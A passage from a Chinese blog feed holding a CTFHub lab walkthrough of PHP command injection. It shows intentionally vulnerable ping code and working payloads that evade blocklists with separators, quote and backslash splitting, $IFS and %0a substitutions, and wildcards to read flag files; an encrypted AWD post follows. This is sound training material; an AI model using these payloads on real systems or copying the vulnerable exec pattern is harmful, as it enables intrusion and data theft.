src="https://img-blog.csdnimg.cn/20201211104639881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>蚁剑连接成功<br><img src="https://img-blog.csdnimg.cn/20201211104731952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="命令注入-过滤cat"><a href="#命令注入-过滤cat" class="headerlink" title="命令注入-过滤cat"></a>命令注入-过滤cat</h2><p>题目描述：过滤了cat命令之后，你还有什么方法能读到 Flag?</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="literal">FALSE</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    <span class="variable">$m</span> = [];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match_all(<span class="string">&quot;/cat/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="string">&quot;ping -c 4 <span class="subst">&#123;$ip&#125;</span>&quot;</span>;</span><br><span class="line">        exec(<span class="variable">$cmd</span>, <span class="variable">$res</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$m</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?ip=|ls</span><br></pre></td></tr></table></figure><p>发现了flag_22422157929595.php<br><img src="https://img-blog.csdnimg.cn/20201211110314508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>题目说过滤了cat，绕过cat</p><ol><li> 单引号或双引号绕过<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?ip=|ca<span class="string">&#x27;&#x27;</span>t flag_22422157929595.php</span><br><span class="line">?ip=|ca<span class="string">&quot;&quot;</span>t  flag_22422157929595.php</span><br></pre></td></tr></table></figure></li><li>反斜杠绕过<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=|ca\t  flag_22422157929595.php</span><br></pre></td></tr></table></figure></li><li>利用Shell 特殊变量绕过<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?ip=|ca<span class="variable">$@t</span>  flag_22422157929595.php</span><br><span class="line">?ip=|ca<span class="variable">$1t</span>  flag_22422157929595.php</span><br></pre></td></tr></table></figure></li><li>linux中直接查看文件内容的命令<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cat、tac、more、less、head、tail、file -f、nl、sed、sort、uniq</span><br><span class="line"></span><br><span class="line">cat： 由第一行开始显示档案内容</span><br><span class="line">tac： 从最后一行开始显示，可以看出 tac 是 cat 的反向显示！</span><br><span class="line">nl： 显示的时候，随便输出行号！</span><br><span class="line">more： 一页一页的显示档案内容</span><br><span class="line">less 与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页！</span><br><span class="line">head： 查看头几行</span><br><span class="line">tail： 查看尾几行</span><br><span class="line">od： 以二进制的方式读取档案内容！</span><br><span class="line">最常使用的显示档案内容的指令可以说是 cat ，more 及 less 了！</span><br></pre></td></tr></table></figure></li></ol><p>   cat被过滤了，可以使用其他命令，花式Payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">?ip=|tac flag_22422157929595.php</span><br><span class="line">?ip=|more flag_22422157929595.php</span><br><span class="line">?ip=|less flag_22422157929595.php</span><br><span class="line">?ip=|head flag_22422157929595.php</span><br><span class="line">?ip=|tail flag_22422157929595.php</span><br><span class="line">?ip=|file -f flag_22422157929595.php</span><br><span class="line">?ip=|nl flag_22422157929595.php</span><br><span class="line">?ip=|sed flag_22422157929595.php</span><br><span class="line">?ip=|sort flag_22422157929595.php</span><br><span class="line">?ip=|uniq flag_22422157929595.php</span><br></pre></td></tr></table></figure><h2 id="命令注入-过滤空格"><a href="#命令注入-过滤空格" class="headerlink" title="命令注入-过滤空格"></a>命令注入-过滤空格</h2><p>题目描述：这次过滤了空格，你能绕过吗</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="literal">FALSE</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    <span class="variable">$m</span> = [];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match_all(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="string">&quot;ping -c 4 <span class="subst">&#123;$ip&#125;</span>&quot;</span>;</span><br><span class="line">        exec(<span class="variable">$cmd</span>, <span class="variable">$res</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$m</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先查询目录结构</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload:?ip=|ls</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210116153811306.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看flag文件内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload:?ip=|cat flag_177172732728132.php</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210116154101457.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>空格被过滤了，用以下字符代替空格：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt; 、&lt;&gt;、%<span class="number">20</span>(space)、%<span class="number">09</span>(tab)、$IFS$<span class="number">9</span>、 $&#123;IFS&#125;、<span class="variable">$IFS</span>  </span><br></pre></td></tr></table></figure><p>新的Payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=|cat<span class="variable">$&#123;IFS&#125;</span>flag_177172732728132.php</span><br></pre></td></tr></table></figure><p>查看源代码即可得到flag</p><h2 id="命令注入-过滤目录分隔符"><a href="#命令注入-过滤目录分隔符" class="headerlink" title="命令注入-过滤目录分隔符"></a>命令注入-过滤目录分隔符</h2><p>题目描述：这次过滤了目录分割符 / ，你能读到 flag 目录下的 flag 文件吗</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="literal">FALSE</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    <span class="variable">$m</span> = [];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match_all(<span class="string">&quot;/\//&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="string">&quot;ping -c 4 <span class="subst">&#123;$ip&#125;</span>&quot;</span>;</span><br><span class="line">        exec(<span class="variable">$cmd</span>, <span class="variable">$res</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$m</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>老规矩</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload:?ip=|ls</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210116134511443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>一些命令分隔符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">linux中：%<span class="number">0</span>a 、%<span class="number">0</span>d 、; 、&amp; 、| 、&amp;&amp;、||</span><br><span class="line">windows中：%<span class="number">0</span>a、&amp;、|、%<span class="number">1</span>a（一个神奇的角色，作为.bat文件中的命令分隔符）</span><br></pre></td></tr></table></figure><p>由于过滤了目录分隔符 <code>/</code>  ，需要切换到相应目录，并使用 <code>;</code> 分隔符连续执行指令　</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=;<span class="built_in">cd</span> flag_is_here;ls</span><br></pre></td></tr></table></figure><p>cd  进入flag_is_here目录，ls  显示flag_is_here目录里的内容。<br><img src="https://img-blog.csdnimg.cn/20210116134947994.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看flag文件内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?ip=;<span class="built_in">cd</span> flag_is_here;cat flag_3708221509571.php</span><br></pre></td></tr></table></figure><p>查看源代码，拿到flag<br><img src="https://img-blog.csdnimg.cn/20210116135639397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="命令注入-过滤运算符"><a href="#命令注入-过滤运算符" class="headerlink" title="命令注入-过滤运算符"></a>命令注入-过滤运算符</h2><p>题目描述：过滤了几个运算符, 要怎么绕过呢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="literal">FALSE</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    <span class="variable">$m</span> = [];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match_all(<span class="string">&quot;/(\||\&amp;)/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="string">&quot;ping -c 4 <span class="subst">&#123;$ip&#125;</span>&quot;</span>;</span><br><span class="line">        exec(<span class="variable">$cmd</span>, <span class="variable">$res</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$m</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>从代码中，可以看出过滤了 <code>|</code> 与 <code>&amp;</code>运算符 ，那我们就使用 <code>;</code> 分隔符绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload:?ip=;ls</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210116140338276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看文件内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=;cat flag_64982941521735.php</span><br></pre></td></tr></table></figure><p>查看源代码<br><img src="https://img-blog.csdnimg.cn/20210116140509312.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="综合过滤练习"><a href="#综合过滤练习" class="headerlink" title="综合过滤练习"></a>综合过滤练习</h2><p>题目描述：同时过滤了前面几个小节的内容, 如何打出漂亮的组合拳呢?</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="literal">FALSE</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    <span class="variable">$m</span> = [];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match_all(<span class="string">&quot;/(\||&amp;|;| |\/|cat|flag|ctfhub)/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="string">&quot;ping -c 4 <span class="subst">&#123;$ip&#125;</span>&quot;</span>;</span><br><span class="line">        exec(<span class="variable">$cmd</span>, <span class="variable">$res</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$m</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>审计代码，发现过滤了<code>|、&amp;、;、空格、/、cat</code>，以及<code>flag和ctfhub</code>等关键字</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1.查看目录结构：</span><br><span class="line">源命令：|ls</span><br><span class="line"><span class="comment">#%0a代替运算符|</span></span><br><span class="line">Payload:?ip=%0als</span><br><span class="line"></span><br><span class="line">2.查看flag_is_here文件夹下的文件</span><br><span class="line">源命令：;<span class="built_in">cd</span> flag_is_here;ls</span><br><span class="line"><span class="comment">#%0a绕过运算符和;</span></span><br><span class="line"><span class="comment">#$&#123;IFS&#125;代替空格</span></span><br><span class="line"><span class="comment">#flag被过滤了，使用通配符*绕过</span></span><br><span class="line">Payload:?ip=%0acd<span class="variable">$&#123;IFS&#125;</span>*_is_here%0als</span><br><span class="line"></span><br><span class="line">3.查看flag文件内容</span><br><span class="line">源命令：?ip=;<span class="built_in">cd</span> flag_is_here;cat flag_216371105627974.php</span><br><span class="line"><span class="comment">#使用more代替cat</span></span><br><span class="line">Payload:?ip=%0acd<span class="variable">$&#123;IFS&#125;</span>*_is_here%0amore%09*_216371105627974.php </span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：CTFHub靶场通关（四）&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://swhat.github.io/categories/CTF/"/>
    
    <category term="WEB" scheme="https://swhat.github.io/categories/CTF/WEB/"/>
    
    
    <category term="CTFhub" scheme="https://swhat.github.io/tags/CTFhub/"/>
    
    <category term="命令执行" scheme="https://swhat.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>线下AWD攻防赛总结</title>
    <link href="https://swhat.github.io/2021/01/16/%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E6%80%BB%E7%BB%93/"/>
    <id>https://swhat.github.io/2021/01/16/%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E6%80%BB%E7%BB%93/</id>
    <published>2021-01-16T04:03:43.000Z</published>
    <updated>2021-03-27T03:50:41.660Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码不正确。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="85a337800a00338160648ccf3d601fd4fd1071a1c79b9b681e11fd893f4caeaf">fb006b16b8e5177c9c740fc4ecc8cf66a82acd6888d2edb52d5f9c2e2e990fc0db9c929653526f1214957a42441ca59c2d5f0f20d616c290f7d7f72fd71018b30d6d2bb60d9e5d885d04fe90fad7421b8e5e6b8709f4e872e05dffc5861375706d3f9865827b0dd8b6f9e5ac84b26ebc95578126c89aabb263da3e85461f614c9c9fcd34068abae0a4b84ce4d14bb64c8d5d7fca30f60280edfc8e818b7cc7fbe1e7a30f48fc639abbd6cc33fc28429ea8ed3c0766e5af661d6a7a28e1dfcededbfe1c0378f608bc12c3d619050664c23baac897b899cd6089486114cc2c716ad53209dec60e93d13f57000e14f4affb1d2ec3d18cb54247df5c0b117b80feef8766f04bc72288d4ef1546b3513636531ef4c3fae902adea48f309298949129b313651b265e509acfa15af67aeb9f0a9096ab90b5b26b4f351e1afd57fd74334606c460a84458618f7d6a79c0c19c6fb5a0314c8e101cf4d5f22d38e8b78b6e51e618b3dce972037f1b619b8c833fe0ef978167c83bc02e18da78bc3529aa3755db666440869cea64c4174f525ae92d95540cfe969b332781f338e207b57c66f5de4943600a3542e68b0ae668e2a3c87b323825b5eb1d3d0089ab0a377b5fd9eac5a6f1e3020656539351258b3175dd56c408103decd56fef54144b36ff9849e4e3d63923c4b109621837bc0dcf88442b92b3cac3509d334026227a95fe23cdd6ec1f4d881b083ba522253c29da72e0c358276be1794b4c63629d778fc25e2a6b3e06d05ac3e734f18ffebd9276ac432dd018d9f8b79cfd9841408232fe46b847d193aaba31525c5e245b77eb873b75bc6879a3d5eded57d9172d1426d9f240a529f6b4e7837b4b84a9e18a2ac11163ca91e3d169e4c2db967a969a9f4d8eddcc6321d5754522bdf8e36b5ffeb0f5937c09c692d9e23217d4587f4d528be54c331014f2c9dd3796b0d3b22653dedaaac5bdc85d3357c3763620c017ce206fb108d227854db35ca3dfc7890ee392d9d48d33f8f6f3ca1775f9de8117034bbe8d1c1f2eefdb12ae67680dc4d52657c977a0a12c5f254b139a288df843d0c65733df35f67fae3ee928b27f10743f45feb79703daec642e35138ff786b0ac15a62aa2c35ea5ea9046aec287d667982d796a808c1934f2013c60f0d168a98cb518d2b1e201e7e8adb11f5a3a26e47b86f393fbbaae176cfaccf3f920437e4c7cdf7e3ef47b03405296804e6736e3bab317423f17aee49df50b5943714cc742587b3401f44270db2802d1079a8b3f2cd88a7093d66fdabe21b963f271c9ff3071e88a4526eac304a48faba7f50eeb05e136de9daac0658b44f1dc02e2e852b1caa53ed73ec73030d85fc00d1a7a3925cd42c0d0c242f219cc976eb30a14b69989e4c6e8559a3221efb2d25f398c3828b593f1f2b3adb09dba0bb566abc5606b4dd3e4152bc38708c761b41804079efd1420a57a57a6933dbf428ab1666829b43d24b52e23e95f1e3f11f5287d84063a4d08eb536c23b12ccfaae27a22a1de4c5877d9790a685b60a57398e3887c287f505b36aa5fd11e9a054585d99dce133e156d180f2c96cdda8a21ab00f8a9ed27dcf38c2861179b253fccceb1342923036eb95c395fc93aeb6d56851783293f70720d0b53d1ba69993170f5329dfe6d67c9da103ddef278c5c9424056a5d63d26cb2b52434d8b05ef809ec561e25a65559ad0aca99cce64470e2ab5f59aecb649b0fa5ab8e118a379051ccb0bcc490a60a7a1650fce36c6a5dcad02a3fd25aaf9869ea3ad44385d4c6d806a6991a4d45a6b6cea63142408f3dba3729069b791d2a50d01e6d2fa9299b246c36a939f6302e5b18032ab22d95c63fc90d2431277ab9ae2f7c8eb89e966869eb7e59ea66d05eefc152344f52b4d927536c6cd8070c21c33de815f7ef3d82c44f78fc617659b3c3bd0b55af5dbadf484c85cd157a2eeba5851285e5868c6530a363748773241d15ba1787c1b66f97e9f0110be7b49ddb30ec55ed55e3d632c84cf0080b1263839b3ff4a334418242ef656cf00da19961c5997b161da048aed3b497563f630579ff4ffd65e6d81e72a0b0ef957ee5cf1cc6066c78e7783c95f672be77d8a4912209a9c6f651633982fc57af70b7dec56af8fd85ea01c7d8203d8a23de711531e651eb796f29b00ef3b2c0a1f24d6b63a7abfc897abae9f85d510995e748c36671156387fa6b00fe422a53d0ac5b9940c8315db3fddfb36e5c5af47c2aeba3204e17241abc3b1a31ba5c7bbdd4c7a0e37c46729fc939a1e851cd82f16fad7878ec6b7e42f0d915ab2248a96334f1bc0fa7773282a4a9f9dfef3635e8d24d10e19ff369ed0872cb0be5f2676f090a004a66a191b1c24bd6b4cb588ea7dbbd3058dacbd03d14111408ecdfb9510a2fd668b2d1c40f91202deb634f58860c6fd27cc48e27c0ee02ed3765917b9df3f66f019796c2db6392fa7a79e7a62b4e52a82ae0d5ce9fabd8fc1316faf35db9761a244062b5eed3f34ccdc435d6ecff6d672f2ab12d3a3e670957c76c8f19796552b9c8bd4c12e113e33e3a0d3fc002481251c2a8ec6931bc6170c102d1985496af3e9ac5b2fa8ecab708baf8e1fd64f674c9a142cc8b3ed73a5f99015ed296125057d4bef957f2bb020b9700409f8be9d2621a0001cd840f0f3bcd898659d2b503c232329f3f85c18bcc57793b6c9e0643d72a125b6f3a001f432f9b980b7e1d527b9478c0ac1dc586e5b3e7a55ed2f8c30ddab0daa60b55f4b80f4a83fb3ca1d75e5b44f72e8bbc2a26f088cb75ac1a861efd0601fa990322783fa744abc05fe572426d2987b852bbfbcb0e9c9bbf5b659d35700a50659e7d1cbb1c80e6f18a4c645c15f99fcf6bdf32398a8f5ef64c228706045125bc65b3ee77ebe639a709b90f4445cec578a8cde78c385d4aec3e8b49ce19592bd1d0268c30e437a6077d915cac62700a287945f268f8103bdf440adc54c9895c5cad04c784cc05d67aa7318b1f4cccddc174fe36c0a3e1995b9d40a0500af149e743f742c7e1960623b0bc09e5b828b51e5d93d6f6b6cec5d4f5421709c9dbdbdd25ea02d3b879fa28c52ae009b96772eb3250178e1e4c13e9ad1cf41b253b06ec7fff777c4bb38f707c496a341e8ab36e5e181e3dbe44aa968d3fe49f7a8d013be51444687427bb1fdf224da06eb78bcfc404d47b4edf7ee4b416664c9432484a42b0f0acd255c2c025a4a483acff2d5b28720bef79dfda92e628e7dec454baf5dce56f094a09c7417b14a8da996d4021683c7dbfe766c399a8e22e1fe8a5e1fcb3a80c073c15825a845ccfd424ef26f234e157093dafcf70b084e4a986a39796fd3fca709e98815ff72c84fddc8a148d3da3a3308c7bf82502587f602404f7f271260b612062fe0c1ae74d16731214464210c13a6c03abd9275ee62ccf1d59d826d86e9df35f9b1ff8878f109c39f9a8cdd54e7f58cd586458c581a69377a89569fe87f18fe92b6ab3795c7a7e3ba6431b15f4748b54a42c8af788d6d72cb3d38b30c85c35d2b0ceafb70ba6a5d8b9919e59acd319327a209d58c312b9ac16acf9e033c476a8f00be8a0a2e66cab0ae96a7d8929005de835b9ae5408ae4255868fbacc60ece0e586df6816c0987616f1b7249342b8f9c197ef0ecb533ba438ec3b6506adefde2f1180cc36958eea8d0f7eb69ef8c0a46194903e20ae13fc169e2a2125209b72909235dc157e878c3f4218dd89b814b206998ed6927912cf208b55da8344a797bfaaea6f33752c92ff4169567d4c7f8c4da1d683fb47f6c8ef03f2b894cceabd1afa05324eb4314a263bef0949926dd28ac41494f39a46ccc0e15c5a2c6c001b3e04ec7bcc9a0b53ce70111b6881ae2ac38f65daae5e1b8d02088e827b7fd119c3e170df5b744039a513bba81f8f052d290e311cfc23d823119ebb8bbe58b7e849bf00d198630f82352b2323d318832f9ea8f873a6c4ec94f39e3cdf5a1bd5b521728ca75fb2709af4d825bdde98f2b58870a082bed354e3a0c517746402774fa6e3cfc5c05c378369dd7f32cb4664e6222318167b3e8e2ea549e655335777be2cab7e1a79557004db1f5d94b91214ace2ce0b3718cc62b5d4b9c25555c6fbacbc59bb47a15d40350af70a19534add2e0eda6f014ba57edb658ce7c639d6ccbe00ffad70f12f66105fba3044a65324f278095216e263bea196bd51bc4f45f18a1a0effa1845eb39be6154e3b316ac40fab2671ff142420e3822bbad295116de6e8d572f7ad7fd95f51ee0bd1258f4008a48c697bb23f8696c39d00ca6682c732768578c9117a8e3a3f60d5fce5e5daae616289a54bdc20c9e4a3589b1f738fac912fe140c23fdf082671525fe5623b126b4ce8db950c594171a91a321885aced4152892c38d9e5e9fce73926780a64ef93414e8d068ca046302d8e5466780d15ff69f55d709c36b63887a7c212a1a741b49e4127eb0075c540959edfcb2f147aac2f61fa1da1691545d70b1bf8b7698d9434a0b8e1b763742d2a616d5510281daf1531d29e41907e1e595d584effca0eef179e56d0ece294651f06